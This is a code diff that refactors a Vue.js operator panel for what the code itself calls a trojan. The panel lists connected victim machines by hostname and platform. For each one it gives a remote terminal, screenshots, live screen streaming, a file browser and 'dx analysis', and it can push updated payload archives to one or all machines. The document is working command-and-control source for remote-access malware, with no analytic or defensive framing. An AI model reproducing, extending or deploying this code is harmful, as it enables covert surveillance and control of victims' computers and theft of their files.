@@ -1,132 +1,100 @@
 <template>
-  <div id="trojan">
+  <v-container>
     <v-container v-show="!$store.state.clients.verify.show">
-      <!-- <input
-        v-model="verify.password"
-        style="margin-right: 7px"
-        type="password"
-        @keydown.enter="verifyPassword"
-      />
-      
-      <button @click="verifyPassword">verify</button> -->
       <v-container>
         <v-text-field
           name="name"
-          label="验证"
+          label="输入密码"
           v-model="verify.password"
           type="password"
           @keydown.enter="verifyPassword"
         >
-          <v-btn outlined slot="append" @click="verifyPassword">验证</v-btn>
+          <template v-slot:append
+            ><v-btn outlined @click="verifyPassword">验证</v-btn></template
+          >
         </v-text-field>
       </v-container>
     </v-container>
-    <v-container v-if="$store.state.clients.verify.show">
-      <p :style="status_style">{{ server_status }}</p>
-      <!-- <v-menu>
-        <template v-slot:activator="{ on, attrs }"></template>
-      </v-menu> -->
+    <v-container v-if="$store.state.clients.verify.show" class="ma-0 pa-0">
+      <p :style="status_style" class="ml-3">{{ server_status }}</p>
       <v-container>
-        <v-btn-toggle background-color="transparent" v-show="!selectedId">
+        <v-btn-toggle multiple max="0">
           <v-btn @click="updateAllClients" outlined> 更新所有客户端 </v-btn>
         </v-btn-toggle>
-        <v-btn-toggle
-          background-color="transparent"
-          id="client-selected-button-group"
-          v-if="selectedId"
-        >
-          <v-btn
-            outlined
-            class="clientButton"
-            @click="showClientDetails(selectedId)"
-          >
-            详细信息
-          </v-btn>
-          <v-btn outlined class="clientButton" @click="dialog(selectedId)"
-            >分析</v-btn
-          >
-          <v-btn
-            outlined
-            class="clientButton"
-            @click="toControlPage(selectedId)"
-          >
-            终端
-          </v-btn>
-          <v-btn
-            outlined
-            class="clientButton"
-            @click="getScreenshot(selectedId)"
-          >
-            截图
-          </v-btn>
-          <v-btn
-            outlined
-            class="clientButton"
-            @click="toggleVideoCapture(selectedId)"
-          >
-            推流:{{
-              $myUtils.getClientById(selectedId)["streaming"] ? "开" : "关"
-            }}
-          </v-btn>
-          <v-btn
-            outlined
-            class="clientButton"
-            @click="showFileExplorer(selectedId)"
-          >
-            文件浏览器
-          </v-btn>
-          <v-btn
-            outlined
-            class="clientButton"
-            @click="updateThisClientCore(selectedId)"
-          >
-            更新core
-          </v-btn>
-          <v-btn
-            outlined
-            class="clientButton"
-            @click="updateThisClientUtils(selectedId)"
-          >
-            更新utils
-          </v-btn>
-        </v-btn-toggle>
+        <v-alert
+          transition="slide-x-transition"
+          style="
+            position: fixed;
+            right: 0;
+            z-index: 999;
+            bottom: 10px;
+            border: 1px white solid;
+          "
+          dismissible
+          close-icon="fa-close"
+          v-model="screenshot.show"
+          ><v-img
+            :src="screenshot.src"
+            :aspect-ratio="screenshot.ratio"
+            :width="screenshot.width"
+            @click="
+              screenshot.width == '70vw'
+                ? (screenshot.width = '30vw')
+                : (screenshot.width = '70vw')
+            "
+            ><template v-slot:placeholder>
+              <v-row class="fill-height ma-0" align="center" justify="center">
+                <v-progress-circular
+                  indeterminate
+                  color="grey lighten-5"
+                ></v-progress-circular>
+              </v-row> </template></v-img
+        ></v-alert>
       </v-container>
-      <!-- <div v-if="screenshot.src" class="scrennshotWrapper">
-        <p @click="clearImg">X</p>
-        <img
-          id="screenshot"
-          :src="screenshot.src"
-          :style="screenshotStyle"
-          @click="scaleTrigger"
-        />
-      </div> -->
-      <v-container>
-        <!-- <template v-for="i in clientArr" >
-          <div
-            :class="{
-              client: true,
-              streaming: i.streaming,
-              clientselected: checkSelected(i.id),
-            }"
-            @click="showContextMenu(event, i.id)"
-            :key="i.id"
-          >
-            <p>ID: {{ i.id }}</p>
-            <p>主机名: {{ i.主机名 }}</p>
-            <p>平台: {{ i.系统版本名 }}</p>
-          </div>
-        </template> -->
-        <template v-for="i in clientArr">
-          <v-card
-            :key="i.id"
-            color="transparent"
-            @click="showContextMenu(event, i.id)"
-          >
-            <v-card-title>{{ i.id }}</v-card-title>
-            <v-card-subtitle>主机名: {{ i.主机名 }}</v-card-subtitle>
-            <v-card-subtitle>平台: {{ i.系统版本名 }}</v-card-subtitle>
-          </v-card>
-        </template>
+      <v-container style="overflow: auto; height: 65vh">
+        <v-item-group v-model="selectedIndex">
+          <template v-for="i in clientArr">
+            <v-item :key="i.id" v-slot="{ toggle }">
+              <v-card @click="toggle" :class="{ streaming: i.streaming }">
+                <v-card-title>{{ i.id }}</v-card-title>
+                <v-card-subtitle>主机名: {{ i.主机名 }}</v-card-subtitle>
+                <v-card-subtitle>平台: {{ i.系统版本名 }}</v-card-subtitle>
+                <v-card-actions>
+                  <v-menu offset-y
+                    ><template v-slot:activator="{ on }">
+                      <v-btn v-on="on">操作</v-btn></template
+                    >
+                    <v-btn-toggle dense style="overflow: auto">
+                      <v-btn dense @click="showClientDetails(i.id)">
+                        详细信息
+                      </v-btn>
+                      <v-btn dense @click="dialog(i.id)">分析</v-btn>
+                      <v-btn dense @click="toControlPage(i.id)"> 终端 </v-btn>
+                      <v-btn dense @click="getScreenshot(i.id)"> 截图 </v-btn>
+                      <v-btn dense @click="toggleVideoCapture(i.id)">
+                        推流:{{
+                          $myUtils.getClientById(clientArr, i.id)["streaming"]
+                            ? "开"
+                            : "关"
+                        }}
+                      </v-btn>
+                      <v-btn dense @click="showFileExplorer(i.id)">
+                        文件浏览器
+                      </v-btn>
+                      <v-btn dense @click="updateThisClientCore(i.id)">
+                        更新core
+                      </v-btn>
+                      <v-btn dense @click="updateThisClientUtils(i.id)">
+                        更新utils
+                      </v-btn>
+                    </v-btn-toggle>
+                  </v-menu>
+                </v-card-actions>
+              </v-card>
+            </v-item>
+          </template>
+        </v-item-group>
+
         <p v-show="!clientArr.length">列表为空</p>
       </v-container>
       <context-menu
@@ -134,22 +102,8 @@
         :msg="msg"
         :template="contextMenu.template"
       ></context-menu>
-      <notification-pop
-        title="截图"
-        type="corner"
-        ref="notification"
-        :show="screenshot.show"
-        @close="screenshot.show = false"
-      >
-        <img
-          :src="screenshot.src"
-          :style="screenshotStyle"
-          @click="scaleTrigger"
-        />
-        <p>点击进行缩放</p></notification-pop
-      >
     </v-container>
-  </div>
+  </v-container>
 </template>
 
 <script>
@@ -167,6 +121,7 @@ export default {
       },
       clientArr: [],
       selectedId: "",
+      selectedIndex: null,
       interval: null,
       touchTimeout: 0,
       // server_status: window.server_status,
@@ -176,6 +131,8 @@ export default {
         show: false,
         enlarge: false,
         src: "",
+        ratio: 16 / 9,
+        width: "30vw",
       },
       contextMenu: {
         template: [
@@ -201,7 +158,7 @@ export default {
             click: () => {
               let that = this;
               console.log(this.msg.id);
-              window.io.emit("apilistdir", that.msg.id, ".");
+              this.$store.state.io.emit("apilistdir", that.msg.id, ".");
               that.$router.push({
                 path: `/trojan/fileexplorer`,
                 query: {
@@ -213,20 +170,24 @@ export default {
           {
             label: "获取此客户端屏幕截图",
             click: () => {
-              window.io.emit("apigetscreenshot", this.msg.id);
+              this.$store.state.io.emit("apigetscreenshot", this.msg.id);
             },
           },
           {
             label: "开启此客户端屏幕推流",
             click: () => {
-              window.io.emit("apistartvideocapture", this.msg.id);
+              this.$store.state.io.emit("apistartvideocapture", this.msg.id);
             },
           },
           // { type: "separator" },
           {
             label: "更新此客户端",
             click: () => {
-              window.io.emit("apiupdatethisclient", this.msg.id, "backend");
+              this.$store.state.io.emit(
+                "apiupdatethisclient",
+                this.msg.id,
+                "backend"
+              );
             },
           },
           // { label: "Menu Item 2", type: "checkbox", checked: true },
@@ -296,7 +257,22 @@ export default {
     //   return function (id) {};
     // },
   },
-  watch: {},
+  watch: {
+    selectedIndex: {
+      handler(nv, ov) {
+        if (nv == undefined) {
+          this.selectedId = "";
+          return;
+        }
+        this.selectedId = this.clientArr[nv].id;
+      },
+    },
+    "window.screenshot": {
+      handler(nv, ov) {
+        this.screenshot.src = window.screenshot;
+      },
+    },
+  },
   beforeMount() {
     let that = this;
     document.documentElement.addEventListener("keydown", (e) => {
@@ -331,43 +307,43 @@ export default {
       },
     });
 
-    if (!window.io) {
-      window.io = sio.connect(`${SERVER_ADDRESS}:${SERVER_PORT}`, {
+    if (!this.$store.state.io) {
+      this.$store.state.io = sio.connect(`${SERVER_ADDRESS}:${SERVER_PORT}`, {
         // withCredentials: true,
       });
-      window.ss = ss;
+      this.$store.state.ss = ss;
       // window.server_status = "未连接";
 
-      window.io.on("connect", () => {
-        window.io.send({ admin: true });
-        window.server_status = "已连接";
+      this.$store.state.io.on("connect", () => {
+        this.$store.state.io.send({ admin: true });
+        this.server_status = "已连接";
       });
 
-      window.io.on("disconnect", () => {
-        window.server_status = "已断开";
+      this.$store.state.io.on("disconnect", () => {
+        this.server_status = "已断开";
       });
 
-      window.io.on("apigetallclients", (carr) => {
-        window.clientArr = carr;
-        window.server_status = "已连接";
+      this.$store.state.io.on("apigetallclients", (carr) => {
+        this.clientArr = carr;
+        this.server_status = "已连接";
       });
 
-      window.io.on("apisendcmd", (cmdresult) => {
+      this.$store.state.io.on("apisendcmd", (cmdresult) => {
         window.cmdResult.data = cmdresult.data;
         console.log(cmdresult);
       });
 
-      window.io.on("apigetscreenshot", (imgbase64) => {
-        window.screenshot = `data:image/jpg;base64,${imgbase64}`;
+      this.$store.state.io.on("apigetscreenshot", (imgbase64) => {
+        this.screenshot.src = `data:image/jpg;base64,${imgbase64}`;
         this.screenshot.show = true;
       });
 
-      window.io.on("apidialog", (dialogContent) => {
+      this.$store.state.io.on("apidialog", (dialogContent) => {
         this.$store.commit("setGlobalStatus", "dx分析完毕");
         console.log(dialogContent);
       });
 
-      window.io.on("debug", (msg) => {
+      this.$store.state.io.on("debug", (msg) => {
         console.log(`--DEBUG:\n${msg}`);
       });
     }
@@ -375,11 +351,11 @@ export default {
     //先一秒后五秒获取服务器数据,以优化输入密码时造成的不流畅现象
     this.interval = setInterval(() => {
       //!!
-      window.io.emit("apigetallclients");
+      this.$store.state.io.emit("apigetallclients");
 
-      that.clientArr = window.clientArr;
-      that.server_status = window.server_status;
-      that.screenshot.src = window.screenshot;
+      // that.clientArr = window.clientArr;
+      // that.server_status = window.server_status;
+      window.clientArr = this.clientArr;
       that.$forceUpdate();
     }, 1000);
 
@@ -389,11 +365,12 @@ export default {
       tmp = null;
       this.interval = setInterval(() => {
         //!!
-        window.io.emit("apigetallclients");
+        this.$store.state.io.emit("apigetallclients");
 
-        that.clientArr = window.clientArr;
-        that.server_status = window.server_status;
-        that.screenshot.src = window.screenshot;
+        // that.clientArr = window.clientArr;
+        // that.server_status = window.server_status;
+        // that.screenshot.src = window.screenshot;
+        window.clientArr = this.clientArr;
         that.$forceUpdate();
       }, 5000);
     }, 2000);
@@ -424,11 +401,11 @@ export default {
       this.$router.push("/trojan/control/" + id);
     },
     showClientDetails(id) {
-      for (let i = 0; i < window.clientArr.length; i++) {
-        if (window.clientArr[i].id === id) {
+      for (let i = 0; i < this.clientArr.length; i++) {
+        if (this.clientArr[i].id === id) {
           let str = "";
-          for (let item in window.clientArr[i]) {
-            str += `${item}: ${window.clientArr[i][item]}\n`;
+          for (let item in this.clientArr[i]) {
+            str += `${item}: ${this.clientArr[i][item]}\n`;
             // console.log(`${item}: ${window.clientArr[i][item]}`);
           }
           alert(str);
@@ -437,16 +414,21 @@ export default {
       }
     },
     getScreenshot(id) {
-      window.io.emit("apigetscreenshot", id);
+      this.screenshot.src = null;
+      this.$store.state.io.emit("apigetscreenshot", id);
     },
     updateThisClient(id) {
-      window.io.emit("apiupdatethisclient", id, "serviceCore.zip");
+      this.$store.state.io.emit("apiupdatethisclient", id, "serviceCore.zip");
     },
     updateThisClientCore(id) {
-      window.io.emit("apiupdatethisclientcore", id, "serviceCore.zip");
+      this.$store.state.io.emit(
+        "apiupdatethisclientcore",
+        id,
+        "serviceCore.zip"
+      );
     },
     updateThisClientUtils(id) {
-      window.io.emit("apiupdatethisclientutils", id, "utils.zip");
+      this.$store.state.io.emit("apiupdatethisclientutils", id, "utils.zip");
     },
     showContextMenu(event, id) {
       // window.ipcRenderer.send("show-context-menu", {
@@ -477,7 +459,7 @@ export default {
       }, 1500);
     },
     updateAllClients() {
-      window.io.emit("apiupdateallclients", this.newBackendName);
+      this.$store.state.io.emit("apiupdateallclients", this.newBackendName);
     },
     scaleTrigger() {
       this.screenshot.enlarge = !this.screenshot.enlarge;
@@ -501,28 +483,30 @@ export default {
     },
     toggleVideoCapture(id) {
       let that = this;
-      const streaming = that.$myUtils.getClientById(id)["streaming"];
+      const streaming = that.$myUtils.getClientById(this.clientArr, id)[
+        "streaming"
+      ];
 
       if (streaming) {
-        window.io.emit("apistopvideocapture", id);
+        this.$store.state.io.emit("apistopvideocapture", id);
       } else {
-        window.io.emit("apistartvideocapture", id);
+        this.$store.state.io.emit("apistartvideocapture", id);
       }
     },
     stopVideoCapture() {
       const that = this;
-      for (const item of window.clientArr) {
+      for (const item of this.clientArr) {
         if (item["streaming"] || item["id"] == that.selectedId) {
-          window.io.emit("apistopvideocapture", item["id"]);
+          this.$store.state.io.emit("apistopvideocapture", item["id"]);
         }
       }
     },
     startVideoCapture(id) {
-      window.io.emit("apistartvideocapture", id);
+      this.$store.state.io.emit("apistartvideocapture", id);
     },
     showFileExplorer(id) {
       const that = this;
-      window.io.emit("apilistdir", id, ".");
+      this.$store.state.io.emit("apilistdir", id, ".");
       that.$router.push({
         path: `/trojan/fileexplorer`,
         query: {
@@ -531,7 +515,7 @@ export default {
       });
     },
     dialog(selectedId) {
-      window.io.emit("apidialog", selectedId);
+      this.$store.state.io.emit("apidialog", selectedId);
       this.$store.commit("setGlobalStatus", `正在dx分析中...`);
     },
   },
@@ -543,13 +527,6 @@ export default {
 </script>
 
 <style lang="scss">
-#trojan {
-  overflow: auto;
-  // #clients-content-wrapper {
-  //   overflow: auto;
-  //   height: 60vh;
-  // }
-}
 .scrennshotWrapper {
   position: relative;
   p {
@@ -572,45 +549,45 @@ export default {
   transition: 0.3s;
   border: 1px solid black;
 }
-#ClientGroup {
-  display: flex;
-  flex-direction: row;
-  overflow: auto;
-  height: 60vh;
-  // height: 400px;
-  // height: 80%;
-  padding-top: 10px;
-  width: 100vw;
-  box-sizing: border-box;
-  padding: 5px 2% 0 2%;
-  flex-wrap: wrap;
-  align-items: flex-start;
-  justify-content: space-between;
+// #ClientGroup {
+//   display: flex;
+//   flex-direction: row;
+//   overflow: auto;
+//   height: 60vh;
+//   // height: 400px;
+//   // height: 80%;
+//   padding-top: 10px;
+//   width: 100vw;
+//   box-sizing: border-box;
+//   padding: 5px 2% 0 2%;
+//   flex-wrap: wrap;
+//   align-items: flex-start;
+//   justify-content: space-between;
 
-  .client {
-    box-sizing: border-box;
-    padding: 2%;
-    border: 1px solid black;
-    display: flex;
-    flex-direction: column;
-    justify-content: left;
-    // margin: 0 1% 10px 1%;
-    margin-bottom: 2%;
-    text-align: left;
-    // width: 46vw;
-    width: 49%;
+//   .client {
+//     box-sizing: border-box;
+//     padding: 2%;
+//     border: 1px solid black;
+//     display: flex;
+//     flex-direction: column;
+//     justify-content: left;
+//     // margin: 0 1% 10px 1%;
+//     margin-bottom: 2%;
+//     text-align: left;
+//     // width: 46vw;
+//     width: 49%;
 
-    p {
-      user-select: none;
-    }
+//     p {
+//       user-select: none;
+//     }
 
-    &:hover {
-      box-shadow: 0px 5px 10px gray;
-      cursor: pointer;
-      transition: 0.2s;
-    }
-  }
-}
+//     &:hover {
+//       box-shadow: 0px 5px 10px gray;
+//       cursor: pointer;
+//       transition: 0.2s;
+//     }
+//   }
+// }
 
 .streaming {
   animation: streaming infinite alternate 1.5s;
@@ -637,7 +614,7 @@ export default {
   from {
   }
   to {
-    background-color: rgb(197, 231, 197);
+    background-color: rgb(47, 85, 47);
   }
 }
 </style>
